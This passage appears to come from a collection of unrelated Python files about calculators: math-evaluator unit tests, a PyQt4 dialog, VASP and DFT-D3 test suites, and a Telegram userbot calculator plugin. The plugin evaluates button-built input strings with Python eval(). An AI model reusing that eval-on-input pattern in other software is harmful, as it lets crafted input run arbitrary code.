assert_function_values(self, fname, ins, outs, tolerance=1e-3):\n        \"\"\"\n        Helper function to test many values at once\n\n        Test the accuracy of evaluator's use of the function given by fname\n        Specifically, the equality of `fname(ins[i])` against outs[i].\n        This is used later to test a whole bunch of f(x) = y at a time\n        \"\"\"\n\n        for (arg, val) in zip(ins, outs):\n            input_str = \"{0}({1})\".format(fname, arg)\n            result = calc.evaluator({}, {}, input_str)\n            fail_msg = \"Failed on function {0}: '{1}' was not {2}\".format(\n                fname, input_str, val\n            )\n            self.assertAlmostEqual(val, result, delta=tolerance, msg=fail_msg)\n\n    def test_trig_functions(self):\n        \"\"\"\n        Test the trig functions provided in calc.py\n\n        which are: sin, cos, tan, arccos, arcsin, arctan\n        \"\"\"\n\n        angles = ['-pi/4', '0', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sin_values = [-0.707, 0, 0.5, 0.588, -0.707, 0.707, 1.298 + 0.635j]\n        cos_values = [0.707, 1, 0.866, 0.809, -0.707, 0.707, 0.834 - 0.989j]\n        tan_values = [-1, 0, 0.577, 0.727, 1, 1, 0.272 + 1.084j]\n        # Cannot test tan(pi/2) b/c pi/2 is a float and not precise...\n\n        self.assert_function_values('sin', angles, sin_values)\n        self.assert_function_values('cos', angles, cos_values)\n        self.assert_function_values('tan', angles, tan_values)\n\n        # Include those where the real part is between -pi/2 and pi/2\n        arcsin_inputs = ['-0.707', '0', '0.5', '0.588', '1.298 + 0.635*j']\n        arcsin_angles = [-0.785, 0, 0.524, 0.629, 1 + 1j]\n        self.assert_function_values('arcsin', arcsin_inputs, arcsin_angles)\n        # Rather than a complex number, numpy.arcsin gives nan\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arcsin(1.1)')))\n\n        # Include those where the real part is between 0 and pi\n        arccos_inputs = ['1', '0.866', '0.809', '0.834-0.989*j']\n        arccos_angles = [0, 0.524, 0.628, 1 + 1j]\n        self.assert_function_values('arccos', arccos_inputs, arccos_angles)\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(-1.1)')))\n        self.assertTrue(numpy.isnan(calc.evaluator({}, {}, 'arccos(1.1)')))\n\n        # Has the same range as arcsin\n        arctan_inputs = ['-1', '0', '0.577', '0.727', '0.272 + 1.084*j']\n        arctan_angles = arcsin_angles\n        self.assert_function_values('arctan', arctan_inputs, arctan_angles)\n\n    def test_reciprocal_trig_functions(self):\n        \"\"\"\n        Test the reciprocal trig functions provided in calc.py\n\n        which are: sec, csc, cot, arcsec, arccsc, arccot\n        \"\"\"\n        angles = ['-pi/4', 'pi/6', 'pi/5', '5*pi/4', '9*pi/4', '1 + j']\n        sec_values = [1.414, 1.155, 1.236, -1.414, 1.414, 0.498 + 0.591j]\n        csc_values = [-1.414, 2, 1.701, -1.414, 1.414, 0.622 - 0.304j]\n        cot_values = [-1, 1.732, 1.376, 1, 1, 0.218 - 0.868j]\n\n        self.assert_function_values('sec', angles, sec_values)\n        self.assert_function_values('csc', angles, csc_values)\n        self.assert_function_values('cot', angles, cot_values)\n\n        arcsec_inputs = ['1.1547', '1.2361', '2', '-2', '-1.4142', '0.4983+0.5911*j']\n        arcsec_angles = [0.524, 0.628, 1.047, 2.094, 2.356, 1 + 1j]\n        self.assert_function_values('arcsec', arcsec_inputs, arcsec_angles)\n\n        arccsc_inputs = ['-1.1547', '-1.4142', '2', '1.7013', '1.1547', '0.6215-0.3039*j']\n        arccsc_angles = [-1.047, -0.785, 0.524, 0.628, 1.047, 1 + 1j]\n        self.assert_function_values('arccsc', arccsc_inputs, arccsc_angles)\n\n        # Has the same range as arccsc\n        arccot_inputs = ['-0.5774', '-1', '1.7321', '1.3764', '0.5774', '(0.2176-0.868*j)']\n        arccot_angles = arccsc_angles\n        self.assert_function_values('arccot', arccot_inputs, arccot_angles)\n\n    def test_hyperbolic_functions(self):\n        \"\"\"\n        Test the hyperbolic functions\n\n        which are: sinh, cosh, tanh, sech, csch, coth\n        \"\"\"\n        inputs = ['0', '0.5', '1', '2', '1+j']\n        neg_inputs = ['0', '-0.5', '-1', '-2', '-1-j']\n        negate = lambda x: [-k for k in x]\n\n        # sinh is odd\n        sinh_vals = [0, 0.521, 1.175, 3.627, 0.635 + 1.298j]\n        self.assert_function_values('sinh', inputs, sinh_vals)\n        self.assert_function_values('sinh', neg_inputs, negate(sinh_vals))\n\n        # cosh is even - do not negate\n        cosh_vals = [1, 1.128, 1.543, 3.762, 0.834 + 0.989j]\n        self.assert_function_values('cosh', inputs, cosh_vals)\n        self.assert_function_values('cosh', neg_inputs, cosh_vals)\n\n        # tanh is odd\n        tanh_vals = [0, 0.462, 0.762, 0.964, 1.084 + 0.272j]\n        self.assert_function_values('tanh', inputs, tanh_vals)\n        self.assert_function_values('tanh', neg_inputs, negate(tanh_vals))\n\n        # sech is even - do not negate\n        sech_vals = [1, 0.887, 0.648, 0.266, 0.498 - 0.591j]\n        self.assert_function_values('sech', inputs, sech_vals)\n        self.assert_function_values('sech', neg_inputs, sech_vals)\n\n        # the following functions do not have 0 in their domain\n        inputs = inputs[1:]\n        neg_inputs = neg_inputs[1:]\n\n        # csch is odd\n        csch_vals = [1.919, 0.851, 0.276, 0.304 - 0.622j]\n        self.assert_function_values('csch', inputs, csch_vals)\n        self.assert_function_values('csch', neg_inputs, negate(csch_vals))\n\n        # coth is odd\n        coth_vals = [2.164, 1.313, 1.037, 0.868 - 0.218j]\n        self.assert_function_values('coth', inputs, coth_vals)\n        self.assert_function_values('coth', neg_inputs, negate(coth_vals))\n\n    def test_hyperbolic_inverses(self):\n        \"\"\"\n        Test the inverse hyperbolic functions\n\n        which are of the form arc[X]h\n        \"\"\"\n        results = [0, 0.5, 1, 2, 1 + 1j]\n\n        sinh_vals = ['0', '0.5211', '1.1752', '3.6269', '0.635+1.2985*j']\n        self.assert_function_values('arcsinh', sinh_vals, results)\n\n        cosh_vals = ['1', '1.1276', '1.5431', '3.7622', '0.8337+0.9889*j']\n        self.assert_function_values('arccosh', cosh_vals, results)\n\n        tanh_vals = ['0', '0.4621', '0.7616', '0.964', '1.0839+0.2718*j']\n        self.assert_function_values('arctanh', tanh_vals, results)\n\n        sech_vals = ['1.0', '0.8868', '0.6481', '0.2658', '0.4983-0.5911*j']\n        self.assert_function_values('arcsech', sech_vals, results)\n\n        results = results[1:]\n        csch_vals = ['1.919', '0.8509', '0.2757', '0.3039-0.6215*j']\n        self.assert_function_values('arccsch', csch_vals, results)\n\n        coth_vals = ['2.164', '1.313', '1.0373', '0.868-0.2176*j']\n        self.assert_function_values('arccoth', coth_vals, results)\n\n    def test_other_functions(self):\n        \"\"\"\n        Test the non-trig functions provided in calc.py\n\n        Specifically:\n          sqrt, log10, log2, ln, abs,\n          fact, factorial\n        \"\"\"\n\n        # Test sqrt\n        self.assert_function_values(\n            'sqrt',\n            [0, 1, 2, 1024],  # -1\n            [0, 1, 1.414, 32]  # 1j\n        )\n        # sqrt(-1) is NAN not j (!!).\n\n        # Test logs\n        self.assert_function_values(\n            'log10',\n            [0.1, 1, 3.162, 1000000, '1+j'],\n            [-1, 0, 0.5, 6, 0.151 + 0.341j]\n        )\n        self.assert_function_values(\n            'log2',\n            [0.5, 1, 1.414, 1024, '1+j'],\n            [-1, 0, 0.5, 10, 0.5 + 1.133j]\n        )\n        self.assert_function_values(\n            'ln',\n            [0.368, 1, 1.649, 2.718, 42, '1+j'],\n            [-1, 0, 0.5, 1, 3.738, 0.347 + 0.785j]\n        )\n\n        # Test abs\n        self.assert_function_values('abs', [-1, 0, 1, 'j'], [1, 0, 1, 1])\n\n        # Test factorial\n        fact_inputs = [0, 1, 3, 7]\n        fact_values = [1, 1, 6, 5040]\n        self.assert_function_values('fact', fact_inputs, fact_values)\n        self.assert_function_values('factorial', fact_inputs, fact_values)\n\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"fact(0.5)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(-1)\")\n        self.assertRaises(ValueError, calc.evaluator, {}, {}, \"factorial(0.5)\")\n\n    def test_constants(self):\n        \"\"\"\n        Test the default constants provided in calc.py\n\n        which are: j (complex number), e, pi, k, c, T, q\n        \"\"\"\n\n        # Of the form ('expr', python value, tolerance (or None for exact))\n        default_variables = [\n            ('i', 1j, None),\n            ('j', 1j, None),\n            ('e', 2.7183, 1e-4),\n            ('pi', 3.1416, 1e-4),\n            ('k', 1.3806488e-23, 1e-26),  # Boltzmann constant (Joules/Kelvin)\n            ('c', 2.998e8, 1e5),  # Light Speed in (m/s)\n            ('T', 298.15, 0.01),  # Typical room temperature (Kelvin)\n            ('q', 1.602176565e-19, 1e-22)  # Fund. Charge (Coulombs)\n        ]\n        for (variable, value, tolerance) in default_variables:\n            fail_msg = \"Failed on constant '{0}', not within bounds\".format(\n                variable\n            )\n            result = calc.evaluator({}, {}, variable)\n            if tolerance is None:\n                self.assertEqual(value, result, msg=fail_msg)\n            else:\n                self.assertAlmostEqual(\n                    value, result,\n                    delta=tolerance, msg=fail_msg\n                )\n\n    def test_complex_expression(self):\n        \"\"\"\n        Calculate combinations of operators and default functions\n        \"\"\"\n\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"(2^2+1.0)/sqrt(5e0)*5-1\"),\n            10.180,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"1+1/(1+1/(1+1/(1+1)))\"),\n            1.6,\n            delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"10||sin(7+5)\"),\n            -0.567, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"sin(e)\"),\n            0.41, delta=0.01\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"k*T/q\"),\n            0.025, delta=1e-3\n        )\n        self.assertAlmostEqual(\n            calc.evaluator({}, {}, \"e^(j*pi)\"),\n            -1, delta=1e-5\n        )\n\n    def test_explicit_sci_notation(self):\n        \"\"\"\n        Expressions like 1.6*10^-3 (not 1.6e-3) it should evaluate.\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^-3\"),\n            -0.0016\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(-3)\"),\n            -0.0016\n        )\n\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^3\"),\n            -1600\n        )\n        self.assertEqual(\n            calc.evaluator({}, {}, \"-1.6*10^(3)\"),\n            -1600\n        )\n\n    def test_simple_vars(self):\n        \"\"\"\n        Substitution of variables into simple equations\n        \"\"\"\n        variables = {'x': 9.72, 'y': 7.91, 'loooooong': 6.4}\n\n        # Should not change value of constant\n        # even with different numbers of variables...\n        self.assertEqual(calc.evaluator({'x': 9.72}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, '13'), 13)\n        self.assertEqual(calc.evaluator(variables, {}, '13'), 13)\n\n        # Easy evaluation\n        self.assertEqual(calc.evaluator(variables, {}, 'x'), 9.72)\n        self.assertEqual(calc.evaluator(variables, {}, 'y'), 7.91)\n        self.assertEqual(calc.evaluator(variables, {}, 'loooooong'), 6.4)\n\n        # Test a simple equation\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, '3*x-y'),\n            21.25, delta=0.01  # = 3 * 9.72 - 7.91\n        )\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, 'x*y'),\n            76.89, delta=0.01\n        )\n\n        self.assertEqual(calc.evaluator({'x': 9.72, 'y': 7.91}, {}, \"13\"), 13)\n        self.assertEqual(calc.evaluator(variables, {}, \"13\"), 13)\n        self.assertEqual(\n            calc.evaluator(\n                {'a': 2.2997471478310274, 'k': 9, 'm': 8, 'x': 0.6600949841121},\n                {}, \"5\"\n            ),\n            5\n        )\n\n    def test_variable_case_sensitivity(self):\n        \"\"\"\n        Test the case sensitivity flag and corresponding behavior\n        \"\"\"\n        self.assertEqual(\n            calc.evaluator({'R1': 2.0, 'R3': 4.0}, {}, \"r1*r3\"),\n            8.0\n        )\n\n        variables = {'t': 1.0}\n        self.assertEqual(calc.evaluator(variables, {}, \"t\"), 1.0)\n        self.assertEqual(calc.evaluator(variables, {}, \"T\"), 1.0)\n        self.assertEqual(\n            calc.evaluator(variables, {}, \"t\", case_sensitive=True),\n            1.0\n        )\n        # Recall 'T' is a default constant, with value 298.15\n        self.assertAlmostEqual(\n            calc.evaluator(variables, {}, \"T\", case_sensitive=True),\n            298, delta=0.2\n        )\n\n    def test_simple_funcs(self):\n        \"\"\"\n        Subsitution of custom functions\n        \"\"\"\n        variables = {'x': 4.712}\n        functions = {'id': lambda x: x}\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator({}, functions, 'id(2.81)'), 2.81)\n        self.assertEqual(calc.evaluator(variables, functions, 'id(x)'), 4.712)\n\n        functions.update({'f': numpy.sin})\n        self.assertAlmostEqual(\n            calc.evaluator(variables, functions, 'f(x)'),\n            -1, delta=1e-3\n        )\n\n    def test_function_case_insensitive(self):\n        \"\"\"\n        Test case insensitive evaluation\n\n        Normal functions with some capitals should be fine\n        \"\"\"\n        self.assertAlmostEqual(\n            -0.28,\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=False),\n            delta=1e-3\n        )\n\n    def test_function_case_sensitive(self):\n        \"\"\"\n        Test case sensitive evaluation\n\n        Incorrectly capitilized should fail\n        Also, it should pick the correct version of a function.\n        \"\"\"\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'SiN'):\n            calc.evaluator({}, {}, 'SiN(6)', case_sensitive=True)\n\n        # With case sensitive turned on, it should pick the right function\n        functions = {'f': lambda x: x, 'F': lambda x: x + 1}\n        self.assertEqual(\n            6, calc.evaluator({}, functions, 'f(6)', case_sensitive=True)\n        )\n        self.assertEqual(\n            7, calc.evaluator({}, functions, 'F(6)', case_sensitive=True)\n        )\n\n    def test_undefined_vars(self):\n        \"\"\"\n        Check to see if the evaluator catches undefined variables\n        \"\"\"\n        variables = {'R1': 2.0, 'R3': 4.0}\n\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'QWSEKO'):\n            calc.evaluator({}, {}, \"5+7*QWSEKO\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r2'):\n            calc.evaluator({'r1': 5}, {}, \"r1+r2\")\n        with self.assertRaisesRegexp(calc.UndefinedVariable, 'r1 r3'):\n            calc.evaluator(variables, {}, \"r1*r3\", case_sensitive=True)\n", "18": "# -*- coding: utf-8 -*-\r\n\r\n# Form implementation generated from reading ui file 'Form_CalcIDLEPCDialog.ui'\r\n#\r\n# Created: Sat Dec 01 18:27:17 2012\r\n#      by: PyQt4 UI code generator 4.9\r\n#\r\n# WARNING! All changes made in this file will be lost!\r\n\r\nfrom PyQt4 import QtCore, QtGui\r\n\r\ntry:\r\n    _fromUtf8 = QtCore.QString.fromUtf8\r\nexcept AttributeError:\r\n    _fromUtf8 = lambda s: s\r\n\r\nclass Ui_CalcIDLEPCDialog(object):\r\n    def setupUi(self, CalcIDLEPCDialog):\r\n        CalcIDLEPCDialog.setObjectName(_fromUtf8(\"CalcIDLEPCDialog\"))\r\n        CalcIDLEPCDialog.setWindowModality(QtCore.Qt.WindowModal)\r\n        CalcIDLEPCDialog.resize(400, 300)\r\n        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Fixed)\r\n        sizePolicy.setHorizontalStretch(0)\r\n        sizePolicy.setVerticalStretch(0)\r\n        sizePolicy.setHeightForWidth(CalcIDLEPCDialog.sizePolicy().hasHeightForWidth())\r\n        CalcIDLEPCDialog.setSizePolicy(sizePolicy)\r\n        CalcIDLEPCDialog.setMinimumSize(QtCore.QSize(400, 300))\r\n        CalcIDLEPCDialog.setMaximumSize(QtCore.QSize(400, 300))\r\n        icon = QtGui.QIcon()\r\n        icon.addPixmap(QtGui.QPixmap(_fromUtf8(\":/images/logo_icon.png\")), QtGui.QIcon.Normal, QtGui.QIcon.Off)\r\n        CalcIDLEPCDialog.setWindowIcon(icon)\r\n        CalcIDLEPCDialog.setModal(True)\r\n        self.gridLayout = QtGui.QGridLayout(CalcIDLEPCDialog)\r\n        self.gridLayout.setObjectName(_fromUtf8(\"gridLayout\"))\r\n        self.textEdit = QtGui.QTextEdit(CalcIDLEPCDialog)\r\n        self.textEdit.setReadOnly(True)\r\n        self.textEdit.setObjectName(_fromUtf8(\"textEdit\"))\r\n        self.gridLayout.addWidget(self.textEdit, 0, 0, 1, 2)\r\n        self.progressBar = QtGui.QProgressBar(CalcIDLEPCDialog)\r\n        self.progressBar.setProperty(\"value\", 0)\r\n        self.progressBar.setObjectName(_fromUtf8(\"progressBar\"))\r\n        self.gridLayout.addWidget(self.progressBar, 1, 0, 1, 1)\r\n        self.pushButton = QtGui.QPushButton(CalcIDLEPCDialog)\r\n        self.pushButton.setObjectName(_fromUtf8(\"pushButton\"))\r\n        self.gridLayout.addWidget(self.pushButton, 1, 1, 1, 1)\r\n\r\n        self.retranslateUi(CalcIDLEPCDialog)\r\n        QtCore.QObject.connect(self.pushButton, QtCore.SIGNAL(_fromUtf8(\"clicked()\")), CalcIDLEPCDialog.cancel)\r\n        QtCore.QMetaObject.connectSlotsByName(CalcIDLEPCDialog)\r\n\r\n    def retranslateUi(self, CalcIDLEPCDialog):\r\n        CalcIDLEPCDialog.setWindowTitle(QtGui.QApplication.translate(\"CalcIDLEPCDialog\", \"Idle Pc Calculation\", None, QtGui.QApplication.UnicodeUTF8))\r\n        self.pushButton.setText(QtGui.QApplication.translate(\"CalcIDLEPCDialog\", \"Cancel\", None, QtGui.QApplication.UnicodeUTF8))\r\n\r\nimport svg_resources_rc\r\n", "19": "import os\nimport pytest\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_vasp_check_state(factory, atoms_2co):\n    \"\"\"Run tests to ensure that the VASP check_state() function call\n    works correctly, i.e. correctly sets the working directories and\n    works in that directory.\n\n    This is conditional on the existence of the VASP_COMMAND or\n    VASP_SCRIPT environment variables\"\"\"\n\n    atoms = atoms_2co  # aliasing\n\n    # Test\n    settings = dict(xc='LDA',\n                    prec='Low',\n                    algo='Fast',\n                    ismear=0,\n                    sigma=1.,\n                    istart=0,\n                    lwave=False,\n                    lcharg=False)\n\n    s1 = atoms.get_chemical_symbols()\n\n    calc = factory.calc(**settings)\n\n    atoms.calc = calc\n\n    en1 = atoms.get_potential_energy()\n\n    # Test JSON dumping and restarting works\n    fi = 'json_test.json'\n    calc.write_json(filename=fi)\n\n    assert os.path.isfile(fi)\n\n    calc2 = factory.calc()\n    calc2.read_json(fi)\n    assert not calc2.calculation_required(atoms, ['energy', 'forces'])\n    en2 = calc2.get_potential_energy()\n    assert abs(en1 - en2) < 1e-8\n    os.remove(fi)  # Clean up the JSON file\n\n    # Check that the symbols remain in order (non-sorted)\n    s2 = calc.atoms.get_chemical_symbols()\n    assert s1 == s2\n    s3 = sorted(s2)\n    assert s2 != s3\n\n    # Check that get_atoms() doesn't reset results\n    r1 = dict(calc.results)  # Force a copy\n    calc.get_atoms()\n    r2 = dict(calc.results)\n    assert r1 == r2\n\n    # Make a parameter change to the calculator\n    calc.set(sigma=0.5)\n\n    # Check that we capture a change for float params\n    assert calc.check_state(atoms) == ['float_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    en2 = atoms.get_potential_energy()\n\n    # The change in sigma should result in a small change in energy\n    assert (en1 - en2) > 1e-7\n\n    # Now we make a change in input_params instead\n    calc.kpts = 2\n\n    # Check that this requires a new calculation\n    assert calc.check_state(atoms) == ['input_params']\n    assert calc.calculation_required(atoms, ['energy', 'forces'])\n\n    # Clean up\n    calc.clean()\n", "20": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\n\nfrom . import get_help\n\n__doc__ = get_help(\"help_calculator\")\n\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}/100\"})\n            await e.answer(str(f\"{get}/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}/\"})\n            await e.answer(str(f\"{get}/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: f\"{get}*\"})\n            await e.answer(str(f\"{get}*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "21": "import pytest\nimport numpy as np\n\nfrom ase.data.s22 import create_s22_system\nfrom ase.build import bulk\nfrom ase.calculators.emt import EMT\nfrom ase.calculators.test import numeric_stress, numeric_forces\n\nreleps = 1e-6\nabseps = 1e-8\n\n\npytestmark = [pytest.mark.calculator('dftd3'),\n              pytest.mark.calculator_lite]\n\n\ndef close(val, reference, releps=releps, abseps=abseps):\n    print(val, reference)\n    assert np.abs(val - reference) < max(np.abs(releps * reference), abseps)\n\n\ndef array_close(val, reference, releps=releps, abseps=abseps):\n    valflat = val.flatten()\n    refflat = reference.flatten()\n    for i, vali in enumerate(valflat):\n        close(vali, refflat[i], releps, abseps)\n\n\n@pytest.fixture\ndef system():\n    return create_s22_system('Adenine-thymine_complex_stack')\n\n\ndef test_forces(factory, system):\n    # do all non-periodic calculations with Adenine-Thymine complex\n\n    # Default is D3(zero)\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.6681154466652238)\n\n    # Only check forces once, for the default settings.\n    f_ref = np.array(\n        [[0.0088385621657399, -0.0118387210205813, -0.0143242057174889],\n         [-0.0346912282737323, 0.0177797757792533, -0.0442349785529711],\n         [0.0022759961575945, -0.0087458217241648, -0.0051887171699909],\n         [-0.0049317224619103, -0.0215152368018880, -0.0062290998430756],\n         [-0.0013032612752381, -0.0356240144088481, 0.0203401124180720],\n         [-0.0110305568118348, -0.0182773178473497, -0.0023730575217145],\n         [0.0036258610447203, -0.0074994162928053, -0.0144058177906650],\n         [0.0005289754841564, -0.0035901842246731, -0.0103580836569947],\n         [0.0051775352510856, -0.0051076755874038, -0.0103428268442285],\n         [0.0011299493448658, -0.0185829345539878, -0.0087205807334006],\n         [0.0128459160503721, -0.0248356605575975, 0.0007946691695359],\n         [-0.0063194401470256, -0.0058117310787239, -0.0067932156139914],\n         [0.0013749100498893, -0.0118259631230572, -0.0235404547526578],\n         [0.0219558160992901, -0.0087512938555865, -0.0226017156485839],\n         [0.0001168268736984, -0.0138384169778581, -0.0014850073023105],\n         [0.0037893625607261, 0.0117649062330659, 0.0162375798918204],\n         [0.0011352730068862, 0.0142002748861793, 0.0129337874676760],\n         [-0.0049945288501837, 0.0073929058490670, 0.0088391871214417],\n         [0.0039715118075548, 0.0186949615105239, 0.0114822052853407],\n         [-0.0008003587963147, 0.0161735976004718, 0.0050357997715004],\n         [-0.0033142342134453, 0.0153658921418049, -0.0026233088963388],\n         [-0.0025451124688653, 0.0067994927521733, -0.0017127589489137],\n         [-0.0010451311609669, 0.0067173068779992, 0.0044413725566098],\n         [-0.0030829302438095, 0.0112138539867057, 0.0151213034444885],\n         [0.0117240581287903, 0.0161749855643631, 0.0173269837053235],\n         [-0.0025949288306356, 0.0158830629834040, 0.0155589787340858],\n         [0.0083784268665834, 0.0082132824775010, 0.0090603749323848],\n         [-0.0019694065480327, 0.0115576523485515, 0.0083901101633852],\n         [-0.0020036820791533, 0.0109276020920431, 0.0204922407855956],\n         [-0.0062424587308054, 0.0069848349714167, 0.0088791235460659]])\n\n    array_close(system.get_forces(), f_ref)\n\n    # calculate numerical forces, but use very loose comparison criteria!\n    # dftd3 doesn't print enough digits to stdout to get good convergence\n    f_numer = numeric_forces(system, d=1e-4)\n    array_close(f_numer, f_ref, releps=1e-2, abseps=1e-3)\n\n\ndef test_d2_old(factory, system):\n    system.calc = factory.calc(old=True)\n    close(system.get_potential_energy(), -0.8923443424663762)\n\n\ndef test_d3_bj(factory, system):\n    system.calc = factory.calc(damping='bj')\n    close(system.get_potential_energy(), -1.211193213979179)\n\n\ndef test_d3_zerom(factory, system):\n    system.calc = factory.calc(damping='zerom')\n    close(system.get_potential_energy(), -2.4574447613705717)\n\n\ndef test_d3_bjm(factory, system):\n    system.calc = factory.calc(damping='bjm')\n    close(system.get_potential_energy(), -1.4662085277005799)\n\n\ndef test_alternative_tz(factory, system):\n    system.calc = factory.calc(tz=True)\n    close(system.get_potential_energy(), -0.6160295884482619)\n\n\ndef test_d3_zero_abc(factory, system):\n    system.calc = factory.calc(abc=True)\n    close(system.get_potential_energy(), -0.6528640090262864)\n\n\ndef test_d3_zero_revpbe(factory, system):\n    system.calc = factory.calc(xc='revpbe')\n    close(system.get_potential_energy(), -1.5274869363442936)\n\n\ndef test_bad_xc(factory, system):\n    system.calc = factory.calc(xc='does_not_exist')\n    with pytest.raises(RuntimeError, match='Unknown DFTD3 functional name'):\n        system.get_potential_energy()\n\n\ndef test_custom_damping(factory, system):\n    system.calc = factory.calc(s6=1.1, sr6=1.1, s8=0.6, sr8=0.9, alpha6=13.0)\n    close(system.get_potential_energy(), -1.082846357973487)\n\n\ndef test_d3_bj_abc(factory, system):\n    # A couple of combinations, but not comprehensive\n    system.calc = factory.calc(damping='bj', abc=True)\n    close(system.get_potential_energy(), -1.1959417763402416)\n\n\ndef test_d3_zerom_b3lyp(factory, system):\n    system.calc = factory.calc(damping='zerom', xc='b3-lyp')\n    close(system.get_potential_energy(), -1.3369234231047677)\n\n\ndef test_diamond_stress(factory, system):\n    system = bulk('C')\n\n    system.calc = factory.calc()\n    close(system.get_potential_energy(), -0.2160072476277501)\n\n    # Do one stress for the default settings\n    s_ref = np.array([0.0182329043326,\n                      0.0182329043326,\n                      0.0182329043326,\n                      -3.22757439831e-14,\n                      -3.22766949320e-14,\n                      -3.22766949320e-14])\n\n    array_close(system.get_stress(), s_ref)\n\n    # As with numerical forces, numerical stresses will not be very well\n    # converged due to the limited number of digits printed to stdout\n    # by dftd3. So, use very loose comparison criteria.\n    s_numer = numeric_stress(system, d=1e-4)\n    array_close(s_numer, s_ref, releps=1e-2, abseps=1e-3)\n\n\ndef test_free_energy_bug(factory):\n    # Energy and free_energy should be close to equal.\n    # Due to a bug related to legacy free_energy property handling,\n    # it would double-count the free energy from the DFT calculation.\n    # This test protects against that.\n    atoms = bulk('Au', cubic=True)\n    atoms.rattle(stdev=0.15)\n\n    dftd3 = 